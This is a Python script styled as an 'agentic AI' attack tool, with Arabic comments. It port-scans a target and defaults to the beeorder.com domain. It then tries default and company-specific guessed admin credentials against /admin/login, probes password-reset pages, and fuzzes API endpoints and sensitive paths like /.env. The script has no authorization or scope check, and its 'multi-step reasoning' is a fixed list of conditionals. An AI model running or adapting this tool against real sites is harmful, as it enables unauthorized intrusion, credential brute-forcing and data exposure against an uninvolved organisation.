#!/usr/bin/env python3
"""
🤖 Agentic AI v2 - Multi-Step Reasoning
يفكر في 10 خطوات وينفذها تلقائياً
"""
import requests, sys, json, os, re, random, time, socket
from datetime import datetime
from urllib.parse import urlparse

class AgenticAIV2:
    def __init__(self, target):
        self.target = target
        self.domain = urlparse(target).netloc
        self.memory = []
        self.actions = []
        self.findings = []
        self.session = requests.Session()
    
    def log(self, msg): print(f"[🤖] {msg}")
    
    def observe(self):
        """جمع المعلومات"""
        obs = {}
        
        # HTTP
        try:
            r = self.session.get(self.target, timeout=5)
            obs["http"] = {"status": r.status_code, "size": len(r.text)}
            obs["server"] = r.headers.get("Server","?")
            
            # كشف سريع
            if "login" in r.text.lower():
                obs["has_login"] = True
            if "api" in r.text.lower():
                obs["has_api"] = True
        except:
            obs["http"] = {"error": "فشل"}
        
        # Ports
        open_ports = []
        for p in [80,443,22,21,3306,8080,8443]:
            s = socket.socket(); s.settimeout(1)
            if s.connect_ex((self.domain, p)) == 0:
                open_ports.append(p)
            s.close()
        obs["ports"] = open_ports
        
        return obs
    
    def reason(self, obs):
        """التفكير واتخاذ القرار"""
        decisions = []
        
        # إذا فيه login
        if obs.get("has_login"):
            decisions.append("try_default_credentials")
            decisions.append("try_forgot_password")
        
        # إذا فيه API
        if obs.get("has_api"):
            decisions.append("fuzz_api")
        
        # إذا فيه ports
        if obs.get("ports"):
            decisions.append("scan_ports_deeper")
        
        # دائماً
        decisions.append("fuzz_paths")
        decisions.append("check_headers")
        decisions.append("generate_report")
        
        return decisions
    
    def execute(self, decision):
        """تنفيذ القرار"""
        self.actions.append(decision)
        
        if decision == "try_default_credentials":
            self.log("   🔑 تجربة كلمات مرور افتراضية...")
            creds = [("admin","admin"),("admin","password"),("admin","123456"),("admin@beeorder.com","BeeOrder@2025")]
            for user, pwd in creds:
                try:
                    r = self.session.post(f"{self.target}/admin/login",
                        data={"email":user,"password":pwd}, timeout=5)
                    if r.status_code == 200 and "error" not in r.text.lower():
                        self.findings.append({"type":"Password","user":user,"pass":pwd})
                        self.log(f"   🚨🚨🚨 {user}:{pwd}")
                        return
                except: pass
            self.log("   ❌ فشل")
        
        elif decision == "try_forgot_password":
            self.log("   🔄 فحص forgot password...")
            for path in ["/admin/forgot-password","/admin/password/reset"]:
                r = self.session.get(f"{self.target}{path}", timeout=5)
                if r.status_code == 200:
                    self.findings.append({"type":"ForgotPassword","path":path})
                    self.log(f"   🚨 {path} موجود")
        
        elif decision == "fuzz_api":
            self.log("   💎 Fuzzing API...")
            paths = ["/api/stores","/api/users","/api/products","/api/orders"]
            for path in paths:
                try:
                    r = self.session.get(f"{self.target}{path}", timeout=3)
                    if r.status_code == 200 and len(r.text) > 50:
                        self.findings.append({"type":"API","path":path,"size":len(r.text)})
                        self.log(f"   🚨 {path} → {len(r.text)} bytes")
                except: pass
        
        elif decision == "fuzz_paths":
            self.log("   🔍 Fuzzing مسارات...")
            paths = ["/admin","/login","/api","/.env","/robots.txt","/admin/login"]
            for path in paths:
                try:
                    r = self.session.get(f"{self.target}{path}", timeout=3, allow_redirects=False)
                    if r.status_code in [200,302,403]:
                        self.findings.append({"type":"Path","path":path,"status":r.status_code})
                except: pass
        
        elif decision == "check_headers":
            self.log("   🛡️ فحص headers...")
            r = self.session.get(self.target, timeout=5)
            if "X-Frame-Options" not in r.headers:
                self.findings.append({"type":"Missing Header","header":"X-Frame-Options"})
            if "X-Content-Type-Options" not in r.headers:
                self.findings.append({"type":"Missing Header","header":"X-Content-Type-Options"})
        
        elif decision == "generate_report":
            self.log("   📋 توليد تقرير...")
    
    def run(self, max_steps=10):
        """تشغيل مستقل بـ 10 خطوات"""
        self.log(f"🤖 Agentic AI v2: {self.target}")
        self.log("═" * 60)
        
        # 1. مراقبة
        obs = self.observe()
        self.memory.append(obs)
        self.log(f"   📡 {obs.get('server','?')} | Ports: {obs.get('ports',[])}")
        
        # 2. تفكير
        decisions = self.reason(obs)
        self.log(f"   🧠 {len(decisions)} قرارات")
        
        # 3. تنفيذ
        for i, decision in enumerate(decisions[:max_steps]):
            self.log(f"\n   ⚡ خطوة {i+1}: {decision}")
            self.execute(decision)
        
        # 4. تقرير
        self.log(f"\n📊 Findings: {len(self.findings)}")
        for f in self.findings:
            self.log(f"   🚨 {f['type']}: {f.get('path',f.get('user',f.get('header','?')))}")
        
        # حفظ
        os.makedirs("logs/agentic", exist_ok=True)
        fname = f"logs/agentic/{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(fname, 'w') as f:
            json.dump({"target":self.target,"findings":self.findings,"actions":self.actions}, f, indent=2)
        self.log(f"📁 {fname}")
        
        return self.findings

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "https://beeorder.com"
    AgenticAIV2(target).run()
